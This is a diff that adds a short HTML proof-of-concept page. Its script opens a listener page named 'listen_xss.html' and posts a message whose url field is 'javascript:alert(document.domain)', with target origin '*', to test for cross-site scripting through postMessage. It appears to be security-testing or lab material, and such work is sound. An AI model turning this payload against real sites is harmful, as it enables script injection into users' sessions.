@@ -1,0 +1,19 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <title></title>
+    <meta charset="utf-8" />
+    <script>
+        childwin = window.open('listen_xss.html');
+
+        function sendMessage() {
+            let msg = { url: "javascript:alert(document.domain)" };
+            childwin.postMessage(msg, '*')
+        }
+
+        (function () { setTimeout("sendMessage()", 1000); }()); 
+    </script>
+</head>
+
+</html>
